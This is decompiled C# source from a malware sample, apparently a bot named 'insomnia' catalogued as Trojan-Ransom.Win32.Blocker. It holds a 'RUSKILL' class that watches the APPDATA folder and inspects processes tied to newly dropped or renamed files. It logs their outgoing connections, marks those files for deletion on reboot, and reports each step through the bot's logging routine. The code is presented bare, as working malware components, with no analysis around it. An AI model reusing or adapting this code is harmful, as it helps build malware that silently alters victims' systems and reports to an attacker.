// Decompiled with JetBrains decompiler
// Type: insomnia.Class19
// Assembly: insomnia, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 848092D5-5192-4B4F-B8F0-07AD40D025FA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Blocker.exyo-803dbe7f976d166aef05102db1219065c8b0bb78e3cf85095fc361f891e6a4e0.exe

using System;
using System.Diagnostics;
using System.IO;
using System.Threading;

namespace insomnia
{
  internal class Class19
  {
    public static FileSystemWatcher Field1 = new FileSystemWatcher();

    public static void Method4()
    {
      Class19.Field1.Path = Environment.GetEnvironmentVariable("APPDATA");
      Class19.Field1.NotifyFilter = NotifyFilters.DirectoryName;
      Class19.Field1.NotifyFilter |= NotifyFilters.FileName;
      Class19.Field1.NotifyFilter |= NotifyFilters.Attributes;
      Class19.Field1.Changed += new FileSystemEventHandler(Class19.Method2);
      Class19.Field1.Created += new FileSystemEventHandler(Class19.Method2);
      Class19.Field1.Deleted += new FileSystemEventHandler(Class19.Method2);
      Class19.Field1.Renamed += new RenamedEventHandler(Class19.Method3);
      try
      {
        Class19.Field1.EnableRaisingEvents = true;
      }
      catch
      {
      }
    }

    public static void Method3(object sender, RenamedEventArgs e)
    {
      try
      {
        Class31.Method3("[RUSKILL]: " + string.Format("Dropped file renamed ({0} -> {1})", (object) e.OldName, (object) e.Name), Class26.Field3);
        Thread.Sleep(3000);
        Class19.Method1(e.FullPath);
        if (!Class35.Method1(e.FullPath))
          return;
        Class31.Method3("[RUSKILL]: File successfully marked for deletion upon reboot -> " + e.FullPath, Class26.Field3);
      }
      catch
      {
      }
    }

    public static void Method2(object sender, FileSystemEventArgs e)
    {
      if (e.ChangeType != WatcherChangeTypes.Created)
        return;
      try
      {
        Class31.Method3("[RUSKILL]: " + string.Format("New Drop -> {0}", (object) e.FullPath), Class26.Field3);
        Thread.Sleep(3000);
        Class19.Method1(e.FullPath);
        if (Class35.Method1(e.FullPath))
          Class31.Method3("[RUSKILL]: File successfully marked for deletion upon reboot -> " + e.FullPath, Class26.Field3);
        Thread.Sleep(500);
      }
      catch
      {
      }
    }

    public static void Method1(string A_0)
    {
      foreach (Process process in Process.GetProcesses())
      {
        try
        {
          if (process.MainModule.FileName.Contains(A_0))
          {
            string str = Class33.Method3(process.ProcessName);
            if (str != "")
              Class31.Method3("[RUSKILL]: Outgoing connection detected from " + process.ProcessName + " -> " + str, Class26.Field3);
          }
        }
        catch
        {
        }
      }
    }
  }
}
